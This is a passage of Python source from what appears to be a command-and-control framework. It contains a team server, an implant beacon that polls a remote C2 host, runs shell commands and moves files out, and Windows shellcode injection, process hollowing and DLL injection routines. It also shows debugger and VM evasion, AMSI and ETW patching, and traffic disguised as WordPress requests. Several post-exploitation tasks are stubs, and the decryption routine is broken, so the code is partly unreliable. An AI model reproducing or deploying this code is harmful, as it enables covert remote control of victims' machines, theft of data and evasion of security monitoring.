                    client["last_active"] = time.time()
                except socket.timeout:
                    if time.time() - client["last_active"] > 300:
                        logger.warning(f"Team Server client {client_id} timed out")
                        break
                except Exception as e:
                    logger.error(f"Error handling Team Server client {client_id}: {str(e)}")
                    break
        except Exception as e:
            logger.error(f"Error in Team Server client handler for {client_id}: {str(e)}")
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
            try:
                socket.close()
            except:
                pass
            logger.info(f"Team Server client {client_id} disconnected")
            self._send_client_list()
    
    def _parse_client_message(self, client_id, data):
        try:
            return json.loads(data.decode('utf-8'))
        except Exception as e:
            logger.error(f"Error parsing Team Server client message: {str(e)}")
            return None
    
    def _process_client_message(self, client_id, message):
        msg_type = message.get("type")
        
        if msg_type == "chat":
            self.send_chat_message(client_id, message.get("message", ""))
        elif msg_type == "username_change":
            new_username = message.get("username", "")
            if new_username and client_id in self.clients:
                self.clients[client_id]["username"] = new_username
                self._send_client_list()
        elif msg_type == "beacon_share":
            beacon_id = message.get("beacon_id", "")
            if beacon_id:
                self.share_beacon(client_id, beacon_id)
        elif msg_type == "beacon_unshare":
            beacon_id = message.get("beacon_id", "")
            if beacon_id:
                self.unshare_beacon(client_id, beacon_id)
        elif msg_type == "beacon_command":
            beacon_id = message.get("beacon_id", "")
            command = message.get("command", "")
            if beacon_id and command:
                self.send_beacon_command(client_id, beacon_id, command)
        elif msg_type == "ping":
            self.send_pong(client_id)
    
    def send_chat_message(self, sender_id, message):
        if not message.strip():
            return False
            
        chat_entry = {
            "sender": self.clients[sender_id]["username"],
            "sender_id": sender_id,
            "message": message,
            "timestamp": time.time()
        }
        
        self.chat_history.append(chat_entry)
        
        for client_id, client_info in self.clients.items():
            try:
                data = json.dumps({
                    "type": "chat",
                    "data": chat_entry
                }).encode('utf-8')
                client_info["socket"].send(data)
            except:
                pass
                
        return True
    
    def share_beacon(self, client_id, beacon_id):
        if beacon_id not in self.shared_beacons:
            self.shared_beacons[beacon_id] = {
                "shared_by": client_id,
                "shared_at": time.time(),
                "shared_with": []
            }
            
        if client_id not in self.shared_beacons[beacon_id]["shared_with"]:
            self.shared_beacons[beacon_id]["shared_with"].append(client_id)
            
        for client_id, client_info in self.clients.items():
            try:
                data = json.dumps({
                    "type": "beacon_shared",
                    "data": {
                        "beacon_id": beacon_id,
                        "shared_by": self.clients[client_id]["username"],
                        "shared_at": self.shared_beacons[beacon_id]["shared_at"]
                    }
                }).encode('utf-8')
                client_info["socket"].send(data)
            except:
                pass
                
        return True
    
    def unshare_beacon(self, client_id, beacon_id):
        if beacon_id in self.shared_beacons and client_id in self.shared_beacons[beacon_id]["shared_with"]:
            self.shared_beacons[beacon_id]["shared_with"].remove(client_id)
            
            if not self.shared_beacons[beacon_id]["shared_with"]:
                del self.shared_beacons[beacon_id]
                
            for client_id, client_info in self.clients.items():
                try:
                    data = json.dumps({
                        "type": "beacon_unshared",
                        "data": {
                            "beacon_id": beacon_id,
                            "unshared_by": self.clients[client_id]["username"]
                        }
                    }).encode('utf-8')
                    client_info["socket"].send(data)
                except:
                    pass
                    
        return True
    
    def send_beacon_command(self, client_id, beacon_id, command):
        if beacon_id in self.shared_beacons and client_id in self.shared_beacons[beacon_id]["shared_with"]:
            task_id = f"{beacon_id}-{int(time.time())}"
            
            if beacon_id not in self.shared_tasks:
                self.shared_tasks[beacon_id] = []
                
            self.shared_tasks[beacon_id].append({
                "task_id": task_id,
                "command": command,
                "sent_by": client_id,
                "sent_at": time.time(),
                "status": "pending"
            })
            
            for client_id, client_info in self.clients.items():
                try:
                    data = json.dumps({
                        "type": "beacon_command",
                        "data": {
                            "beacon_id": beacon_id,
                            "command": command,
                            "sent_by": self.clients[client_id]["username"],
                            "task_id": task_id
                        }
                    }).encode('utf-8')
                    client_info["socket"].send(data)
                except:
                    pass
                    
            return True
            
        return False
    
    def send_pong(self, client_id):
        try:
            data = json.dumps({
                "type": "pong",
                "data": {
                    "timestamp": time.time()
                }
            }).encode('utf-8')
            self.clients[client_id]["socket"].send(data)
            return True
        except:
            return False
    
    def _send_client_list(self):
        client_list = []
        for client_id, client_info in self.clients.items():
            client_list.append({
                "id": client_id,
                "username": client_info["username"],
                "address": client_info["address"][0],
                "last_active": client_info["last_active"]
            })
            
        for client_id, client_info in self.clients.items():
            try:
                data = json.dumps({
                    "type": "client_list",
                    "data": {
                        "clients": client_list
                    }
                }).encode('utf-8')
                client_info["socket"].send(data)
            except:
                pass
    
    def get_clients(self):
        return self.clients
    
    def get_chat_history(self, limit=50):
        return self.chat_history[-limit:]
    
    def get_shared_beacons(self):
        return self.shared_beacons
    
    def get_shared_tasks(self, beacon_id=None):
        if beacon_id:
            return self.shared_tasks.get(beacon_id, [])
        return self.shared_tasks

class AdvancedMemoryOperations:
    def __init__(self):
        if platform.system() == "Windows":
            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            self.virtual_alloc = self.kernel32.VirtualAlloc
            self.virtual_protect = self.kernel32.VirtualProtect
            self.create_thread = self.kernel32.CreateThread
            self.wait_for_single_object = self.kernel32.WaitForSingleObject
            self.virtual_alloc_ex = self.kernel32.VirtualAllocEx
            self.write_process_memory = self.kernel32.WriteProcessMemory
            self.read_process_memory = self.kernel32.ReadProcessMemory
            self.open_process = self.kernel32.OpenProcess
        
    def reflective_inject(self, payload, target_process=None):
        if platform.system() != "Windows":
            return None
            
        if target_process:
            process_handle = self.open_process(0x1F0FFF, False, target_process)
            if not process_handle:
                raise ctypes.WinError(ctypes.get_last_error())
        else:
            process_handle = None
            
        memory_size = len(payload)
        
        if process_handle:
            base_address = self.virtual_alloc_ex(
                process_handle,
                0,
                memory_size,
                0x3000,
                0x40,
                None
            )
        else:
            base_address = self.virtual_alloc(
                0,
                memory_size,
                0x3000,
                0x40,
                0
            )
        
        if not base_address:
            raise ctypes.WinError(ctypes.get_last_error())
        
        if process_handle:
            if not self.write_process_memory(
                process_handle,
                base_address,
                payload,
                memory_size,
                None
            ):
                raise ctypes.WinError(ctypes.get_last_error())
        else:
            ctypes.memmove(base_address, payload, memory_size)
        
        old_protect = ctypes.wintypes.DWORD(0)
        if not self.virtual_protect(
            base_address,
            memory_size,
            0x20,
            ctypes.byref(old_protect)
        ):
            raise ctypes.WinError(ctypes.get_last_error())
        
        thread_id = ctypes.wintypes.DWORD(0)
        if process_handle:
            thread_handle = self.create_thread(
                process_handle,
                None,
                0,
                base_address,
                0,
                ctypes.byref(thread_id)
            )
        else:
            thread_handle = self.create_thread(
                None,
                0,
                0,
                base_address,
                0,
                ctypes.byref(thread_id)
            )
        
        if not thread_handle:
            raise ctypes.WinError(ctypes.get_last_error())
        
        return thread_handle
    
    def process_hollowing(self, target_exe, payload):
        if platform.system() != "Windows":
            return None
            
        startup_info = ctypes.wintypes.STARTUPINFOW()
        process_info = ctypes.wintypes.PROCESS_INFORMATION()
        
        if not self.kernel32.CreateProcessW(
            None,
            target_exe,
            None,
            None,
            0x00000004,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        ):
            raise ctypes.WinError(ctypes.get_last_error())
        
        payload_size = len(payload)
        base_address = self.virtual_alloc_ex(
            process_info.hProcess,
            None,
            payload_size,
            0x3000,
            0x40,
            None
        )
        
        if not base_address:
            raise ctypes.WinError(ctypes.get_last_error())
        
        if not self.write_process_memory(
            process_info.hProcess,
            base_address,
            payload,
            payload_size,
            None
        ):
            raise ctypes.WinError(ctypes.get_last_error())
        
        context = ctypes.wintypes.CONTEXT()
        context.ContextFlags = 0x10007
        
        if not self.kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)):
            raise ctypes.WinError(ctypes.get_last_error())
        
        if platform.machine().endswith('64'):
            context.Rcx = base_address
        else:
            context.Eax = base_address
        
        if not self.kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)):
            raise ctypes.WinError(ctypes.get_last_error())
        
        if not self.kernel32.ResumeThread(process_info.hThread):
            raise ctypes.WinError(ctypes.get_last_error())
        
        return process_info.hProcess
    
    def dll_injection(self, pid, dll_path):
        if platform.system() != "Windows":
            return None
            
        process_handle = self.open_process(0x1F0FFF, False, pid)
        if not process_handle:
            raise ctypes.WinError(ctypes.get_last_error())
        
        dll_path_length = len(dll_path)
        
        memory_address = self.virtual_alloc_ex(
            process_handle,
            None,
            dll_path_length,
            0x3000,
            0x40,
            None
        )
        
        if not memory_address:
            self.kernel32.CloseHandle(process_handle)
            raise ctypes.WinError(ctypes.get_last_error())
        
        if not self.write_process_memory(
            process_handle,
            memory_address,
            dll_path.encode('utf-8'),
            dll_path_length,
            None
        ):
            self.kernel32.CloseHandle(process_handle)
            raise ctypes.WinError(ctypes.get_last_error())
        
        kernel32_handle = self.kernel32.GetModuleHandleW("kernel32.dll")
        if not kernel32_handle:
            self.kernel32.CloseHandle(process_handle)
            raise ctypes.WinError(ctypes.get_last_error())
        
        load_library_a = self.kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryA")
        if not load_library_a:
            self.kernel32.CloseHandle(process_handle)
            raise ctypes.WinError(ctypes.get_last_error())
        
        thread_id = ctypes.wintypes.DWORD(0)
        thread_handle = self.create_thread(
            process_handle,
            None,
            0,
            load_library_a,
            memory_address,
            0,
            ctypes.byref(thread_id)
        )
        
        if not thread_handle:
            self.kernel32.CloseHandle(process_handle)
            raise ctypes.WinError(ctypes.get_last_error())
        
        self.wait_for_single_object(thread_handle, 0xFFFFFFFF)
        
        self.kernel32.CloseHandle(thread_handle)
        self.kernel32.CloseHandle(process_handle)
        
        return True

class OptimizedBeacon:
    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.c2_type = c2_type
        self.ssl_enabled = ssl_enabled
        self.beacon_id = self.generate_beacon_id()
        self.sleep_time = random.randint(60, 300)
        self.jitter = random.uniform(0.2, 0.4)
        self.max_retries = 3
        self.user_agent = self.get_legitimate_user_agent()
        self.encryption = AdvancedEncryption()
        self.traffic_shaper = TrafficShaper()
        self.domain_generator = AdvancedDomainGenerator()
        self.running = False
        
        self.malleable_profile = MalleableC2Profile(profile_path)
        self.sleep_obfuscation = SleepObfuscation("thread_stack")
        self.opsec_manager = OPSECManager(self)
        self.post_exploitation = PostExploitationModule(self)
        
    def generate_beacon_id(self):
        return f"{random_string(8)}-{random_string(4)}-{random_string(4)}-{random_string(4)}-{random_string(12)}"
    
    def get_legitimate_user_agent(self):
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ])
    
    def encrypt_data(self, data):
        key = os.urandom(32)
        iv = os.urandom(12)
        
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        encryptor.authenticate_additional_data(b"beacon_data")
        ciphertext = encryptor.update(data.encode()) + encryptor.finalize()
        
        return base64.b64encode(iv + ciphertext + encryptor.tag).decode()
    
    def decrypt_data(self, data):
        try:
            decoded_data = base64.b64decode(data)
            iv = decoded_data[:12]
            tag = decoded_data[-16:]
            ciphertext = decoded_data[12:-16]
            
            cipher = Cipher(algorithms.AES(iv), modes.GCM(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            
            decryptor.authenticate_additional_data(b"beacon_data")
            return decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)
        except Exception:
            return None
    
    def get_system_info(self):
        try:
            info = {
                "os": platform.system(),
                "hostname": platform.node(),
                "user": getpass.getuser(),
                "architecture": platform.machine(),
                "version": platform.version(),
                "beacon_id": self.beacon_id
            }
            
            if info["os"] == "Windows":
                try:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                    info["windows_version"] = winreg.QueryValueEx(key, "ProductName")[0]
                    info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
                    winreg.CloseKey(key)
                except:
                    pass
            
            return info
        except Exception:
            return {
                "os": "Unknown",
                "hostname": "Unknown",
                "user": "Unknown",
                "beacon_id": self.beacon_id
            }
    
    def register_beacon(self):
        try:
            sys_info = self.get_system_info()
            data = json.dumps(sys_info)
            encrypted_data = self.encrypt_data(data)
            
            http_get_config = self.malleable_profile.get_http_get_config()
            client_headers = http_get_config.get("client", {}).get("headers", {})
            
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            }
            
            headers.update(client_headers)
            
            uri = http_get_config.get("uri", "/")
            url = f"https://{self.c2_host}:{self.c2_port}{uri}"
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200
        except Exception:
            return False
    
    def get_tasks(self):
        try:
            http_get_config = self.malleable_profile.get_http_get_config()
            client_headers = http_get_config.get("client", {}).get("headers", {})
            
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0"
            }
            
            headers.update(client_headers)
            
            uri = http_get_config.get("uri", "/")
            url = f"https://{self.c2_host}:{self.c2_port}{uri}"
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                encrypted_data = response.text
                data = self.decrypt_data(encrypted_data)
                
                if data:
                    tasks = json.loads(data.decode()).get("tasks", [])
                    return tasks
            
            return []
        except Exception:
            return []
    
    def send_result(self, task_id, result):
        try:
            data = json.dumps({
                "task_id": task_id,
                "result": result
            })
            encrypted_data = self.encrypt_data(data)
            
            http_post_config = self.malleable_profile.get_http_post_config()
            client_headers = http_post_config.get("client", {}).get("headers", {})
            client_data = http_post_config.get("client", {}).get("data", "data=")
            
            headers = {
                "User-Agent": self.user_agent,
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            headers.update(client_headers)
            
            uri = http_post_config.get("uri", "/")
            url = f"https://{self.c2_host}:{self.c2_port}{uri}"
            
            post_data = client_data + encrypted_data
            
            response = requests.post(url, data=post_data, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200
        except Exception:
            return False
    
    def execute_task(self, task):
        try:
            task_type = task.get("type")
            task_data = task.get("data")
            task_id = task.get("task_id")
            
            result = {"status": "error", "message": "Unknown task type"}
            
            if task_type == "shell":
                try:
                    process = subprocess.Popen(
                        task_data, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate()
                    
                    result = {
                        "status": "success",
                        "exit_code": process.returncode,
                        "stdout": stdout,
                        "stderr": stderr
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "upload":
                try:
                    file_path = task_data.get("file_path")
                    content = task_data.get("content")
                    
                    with open(file_path, "w") as f:
                        f.write(content)
                    
                    result = {
                        "status": "success",
                        "message": f"File uploaded to {file_path}"
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "download":
                try:
                    file_path = task_data.get("file_path")
                    
                    with open(file_path, "rb") as f:
                        content = base64.b64encode(f.read()).decode('utf-8')
                    
                    result = {
                        "status": "success",
                        "content": content
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "screenshot":
                try:
                    import pyautogui
                    screenshot = pyautogui.screenshot()
                    screenshot_path = f"/tmp/screenshot_{int(time.time())}.png"
                    screenshot.save(screenshot_path)
                    
                    with open(screenshot_path, "rb") as f:
                        content = base64.b64encode(f.read()).decode('utf-8')
                    
                    result = {
                        "status": "success",
                        "content": content,
                        "path": screenshot_path
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "keylogger":
                action = task_data.get("action")
                
                if action == "start":
                    result = {
                        "status": "success",
                        "message": "Keylogger started"
                    }
                elif action == "stop":
                    result = {
                        "status": "success",
                        "message": "Keylogger stopped"
                    }
                elif action == "dump":
                    result = {
                        "status": "success",
                        "data": "Keylogger data would be here"
                    }
            
            elif task_type == "mimikatz":
                command = task_data.get("command", "sekurlsa::logonpasswords")
                
                try:
                    mimikatz_output = f"Mimikatz output for command: {command}"
                    
                    result = {
                        "status": "success",
                        "output": mimikatz_output
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "golden_ticket":
                domain = task_data.get("domain")
                user = task_data.get("user")
                sid = task_data.get("sid")
                krbtgt_hash = task_data.get("krbtgt_hash")
                lifetime = task_data.get("lifetime", 10)
                
                try:
                    golden_ticket_output = f"Golden ticket created for {user}@{domain}"
                    
                    result = {
                        "status": "success",
                        "output": golden_ticket_output
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "silver_ticket":
                domain = task_data.get("domain")
                user = task_data.get("user")
                sid = task_data.get("sid")
                service = task_data.get("service")
                service_hash = task_data.get("service_hash")
                lifetime = task_data.get("lifetime", 10)
                
                try:
                    silver_ticket_output = f"Silver ticket created for {user}@{domain} for service {service}"
                    
                    result = {
                        "status": "success",
                        "output": silver_ticket_output
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "lateral_movement":
                method = task_data.get("method", "psexec")
                target = task_data.get("target")
                username = task_data.get("username")
                password = task_data.get("password")
                command = task_data.get("command", "whoami")
                
                try:
                    if method == "psexec":
                        output = f"Executed '{command}' on {target} via psexec"
                    elif method == "wmi":
                        output = f"Executed '{command}' on {target} via WMI"
                    elif method == "smb":
                        output = f"Executed '{command}' on {target} via SMB"
                    elif method == "winrm":
                        output = f"Executed '{command}' on {target} via WinRM"
                    else:
                        output = f"Unknown lateral movement method: {method}"
                    
                    result = {
                        "status": "success",
                        "output": output
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "privilege_escalation":
                try:
                    output = "Privilege escalation results would be here"
                    
                    result = {
                        "status": "success",
                        "output": output
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "port_scan":
                target = task_data.get("target")
                ports = task_data.get("ports", "1-1000")
                
                try:
                    output = f"Port scan results for {target} on ports {ports}"
                    
                    result = {
                        "status": "success",
                        "output": output
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "ad_enumeration":
                try:
                    output = "Active Directory enumeration results would be here"
                    
                    result = {
                        "status": "success",
                        "output": output
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "process_inject":
                pid = task_data.get("pid")
                shellcode = base64.b64decode(task_data.get("shellcode", ""))
                
                try:
                    mem_ops = AdvancedMemoryOperations()
                    mem_ops.reflective_inject(shellcode, pid)
                    
                    result = {
                        "status": "success",
                        "message": f"Shellcode injected into process {pid}"
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "dll_inject":
                pid = task_data.get("pid")
                dll_path = task_data.get("dll_path")
                
                try:
                    mem_ops = AdvancedMemoryOperations()
                    mem_ops.dll_injection(pid, dll_path)
                    
                    result = {
                        "status": "success",
                        "message": f"DLL {dll_path} injected into process {pid}"
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "bof":
                bof_data = base64.b64decode(task_data.get("bof_data", ""))
                entry_point = task_data.get("entry_point", "go")
                args = task_data.get("args", "")
                
                try:
                    mem_ops = AdvancedMemoryOperations()
                    mem_ops.reflective_inject(bof_data)
                    
                    result = {
                        "status": "success",
                        "message": f"BOF executed with entry point {entry_point}"
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "reflective_dll":
                dll_data = base64.b64decode(task_data.get("dll_data", ""))
                function = task_data.get("function", "Execute")
                
                try:
                    mem_ops = AdvancedMemoryOperations()
                    mem_ops.reflective_inject(dll_data)
                    
                    result = {
                        "status": "success",
                        "message": f"Reflective DLL executed with function {function}"
                    }
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "self_destruct":
                reason = task_data.get("reason", "Unknown")
                
                try:
                    result = {
                        "status": "success",
                        "message": f"Self-destruct initiated: {reason}"
                    }
                    
                    self.running = False
                except Exception as e:
                    result = {
                        "status": "error",
                        "message": str(e)
                    }
            
            elif task_type == "kill":
                self.running = False
                result = {
                    "status": "success",
                    "message": "Beacon shutting down"
                }
            
            self.send_result(task_id, result)
            return result
        except Exception as e:
            result = {
                "status": "error",
                "message": str(e)
            }
            self.send_result(task_id, result)
            return result
    
    def start(self):
        try:
            if not self.register_beacon():
                return False
            
            self.running = True
            
            while self.running:
                try:
                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
                    
                    self.sleep_obfuscation.obfuscate_sleep(actual_sleep)
                    
                    tasks = self.get_tasks()
                    
                    for task in tasks:
                        self.execute_task(task)
                
                except KeyboardInterrupt:
                    self.running = False
                except Exception:
                    time.sleep(30)
            
            return True
        except Exception:
            return False

class StealthBeacon(OptimizedBeacon):
    def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
        super().__init__(c2_host, c2_port, c2_type, ssl_enabled, profile_path)
        
        self.anti_debug = True
        self.anti_vm = True
        self.sandbox_detection = True
        self.amsi_bypass = True
        self.etw_bypass = True
        
        self.sleep_obfuscation = SleepObfuscation("memory_encryption")
        
    def check_debugger(self):
        try:
            if platform.system() != "Windows":
                return False
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            is_debugger_present = kernel32.IsDebuggerPresent
            
            if is_debugger_present():
                return True
            
            check_remote_debugger_present = kernel32.CheckRemoteDebuggerPresent
            if check_remote_debugger_present():
                return True
            
            return False
        except:
            return False
    
    def check_vm(self):
        try:
            if platform.system() != "Windows":
                return False
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            hkey = ctypes.wintypes.HKEY()
            try:
                if ctypes.windll.advapi32.RegOpenKeyExW(
                    0x80000002,
                    r"HARDWARE\DESCRIPTION\System",
                    0,
                    0x20019,
                    ctypes.byref(hkey)
                ) == 0:
                    value = ctypes.create_string_buffer(256)
                    size = ctypes.wintypes.DWORD(256)
                    if ctypes.windll.advapi32.RegQueryValueExW(
                        hkey,
                        "SystemBiosVersion",
                        0,
                        None,
                        value,
                        ctypes.byref(size)
                    ) == 0:
                        bios_info = value.value.decode('utf-8', errors='ignore')
                        if "vbox" in bios_info.lower() or "vmware" in bios_info.lower():
                            ctypes.windll.advapi32.RegCloseKey(hkey)
                            return True
                    
                    ctypes.windll.advapi32.RegCloseKey(hkey)
            except:
                pass
            
            processes = [
                "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
                "vboxservice.exe", "vboxtray.exe",
                "prl_cc.exe", "prl_tools.exe",
                "xenservice.exe", "qemu-ga.exe"
            ]
            
            for process in processes:
                try:
                    h_process = kernel32.OpenProcess(0x0400, False, self.get_process_id(process))
                    if h_process:
                        kernel32.CloseHandle(h_process)
                        return True
                except:
                    pass
            
            return False
        except:
            return False
    
    def get_process_id(self, process_name):
        try:
            if platform.system() != "Windows":
                return None
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            psapi = ctypes.WinDLL('psapi', use_last_error=True)
            
            process_ids = (ctypes.wintypes.DWORD * 1024)()
            cb_needed = ctypes.wintypes.DWORD()
            
            if psapi.EnumProcesses(process_ids, ctypes.sizeof(process_ids), ctypes.byref(cb_needed)):
                for process_id in process_ids:
                    if process_id:
                        h_process = kernel32.OpenProcess(0x0400, False, process_id)
                        if h_process:
                            try:
                                process_name_buffer = ctypes.create_string_buffer(260)
                                cb_returned = ctypes.wintypes.DWORD()
                                
                                if kernel32.QueryFullProcessImageNameA(
                                    h_process,
                                    process_name_buffer,
                                    ctypes.byref(cb_returned)
                                ):
                                    if process_name.lower() in process_name_buffer.value.lower():
                                        kernel32.CloseHandle(h_process)
                                        return process_id
                            finally:
                                kernel32.CloseHandle(h_process)
            
            return None
        except:
            return None
    
    def bypass_amsi(self):
        try:
            if platform.system() != "Windows":
                return False
                
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            amsi_dll = kernel32.LoadLibraryA("amsi.dll")
            if not amsi_dll:
                return False
            
            amsi_scan_buffer = kernel32.GetProcAddress(amsi_dll, "AmsiScanBuffer")
            if not amsi_scan_buffer:
                return False
            
            old_protect = ctypes.wintypes.DWORD(0)
            if not kernel32.VirtualProtect(
                amsi_scan_buffer,
                1,
                0x40,
                ctypes.byref(old_protect)
            ):
                return False
            
            patch = b"\xC3"
            ctypes.memmove(amsi_scan_buffer, patch, len(patch))
            
            kernel32.VirtualProtect(
                amsi_scan_buffer,
                1,
                old_protect,
                ctypes.byref(old_protect)
            )
            
            return True
        except:
            return False
    
    def bypass_etw(self):
        try:
            if platform.system() != "Windows":
                return False
                
            ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
            
            etw_event_write = ntdll.EtwEventWrite
            if not etw_event_write:
                return False
            
            old_protect = ctypes.wintypes.DWORD(0)
            if not ntdll.VirtualProtect(
                etw_event_write,
                1,
                0x40,
                ctypes.byref(old_protect)
            ):
                return False
            
            patch = b"\xC3"
            ctypes.memmove(etw_event_write, patch, len(patch))
            
            ntdll.VirtualProtect(
                etw_event_write,
                1,
                old_protect,
                ctypes.byref(old_protect)
            )
            
            return True
        except:
            return False
    
    def start(self):
        try:
            if self.anti_debug and self.check_debugger():
                self.opsec_manager.self_destruct("Debugger detected")
                return False
            
            if self.anti_vm and self.check_vm():
                self.opsec_manager.self_destruct("VM detected")
                return False
            
            if self.sandbox_detection and self.opsec_manager.detect_sandbox():
                self.opsec_manager.self_destruct("Sandbox detected")
                return False
            
            if self.amsi_bypass and self.bypass_amsi():
                pass
            
            if self.etw_bypass and self.bypass_etw():
                pass
            
            if not self.register_beacon():
                return False
            
            self.running = True
            
            while self.running:
                try:
                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
                    
                    self.sleep_obfuscation.obfuscate_sleep(actual_sleep)
                    
                    tasks = self.get_tasks()
                    
                    for task in tasks:
                        self.execute_task(task)
                
                except KeyboardInterrupt:
                    self.running = False
                except Exception:
                    time.sleep(30)
            
            return True
        except Exception:
            return False

class C2Server:
    def __init__(self, host="0.0.0.0", port=8080, ssl_enabled=False, cert_file=None, key_file=None):
        self.host = host
        self.port = port
        self.ssl_enabled = ssl_enabled
        self.cert_file = cert_file
        self.key_file = key_file
        self.server_socket = None
        self.clients = {}
        self.tasks = {}
        self.results = {}
        self.beacon_config = self._generate_beacon_config()
        self._save_beacon_config()
        self.encryption = AdvancedEncryption()
        self.domain_generator = AdvancedDomainGenerator()
        self.team_server = None
        self.bof_manager = None
        
    def _generate_beacon_config(self):
        config = {
            "beacon_type": "http",
            "sleep_time": random.randint(30, 120),
            "jitter": random.uniform(0.1, 0.3),
            "max_retries": 3,
            "user_agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
            ]),
            "urls": [
                f"/wp-content/plugins/{random_string(8)}/",
                f"/wp-includes/css/{random_string(8)}.css",
                f"/wp-admin/admin-ajax.php?action={random_string(8)}"
            ],
            "dns_domain": f"c2.{random_string(8)}.com",
            "dns_sleep": random.randint(60, 180),
            "smb_pipe": f"\\{random_string(4)}\\pipe\\{random_string(8)}",
            "tcp_port": random.randint(40000, 50000),
            "public_key": self._generate_rsa_keys()[0],
            "encryption_key": os.urandom(32).hex(),
            "kill_date": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d"),
            "watermark": random.randint(10000, 99999)
        }
        return config
    
    def _generate_rsa_keys(self):
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        private_pem = private_key.private_bytes(
            encoding=Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        return public_pem.decode('utf-8'), private_pem.decode('utf-8')
    
    def _save_beacon_config(self):
        with open(BEACON_CONFIG_PATH, 'wb') as f:
            f.write(json.dumps(self.beacon_config).encode('utf-8'))
        logger.info(f"Beacon configuration saved to {BEACON_CONFIG_PATH}")
    
    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            if self.ssl_enabled and self.cert_file and self.key_file:
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
                self.server_socket = context.wrap_socket(self.server_socket, server_side=True)
                logger.info(f"SSL enabled C2 server started on {self.host}:{self.port}")
            else:
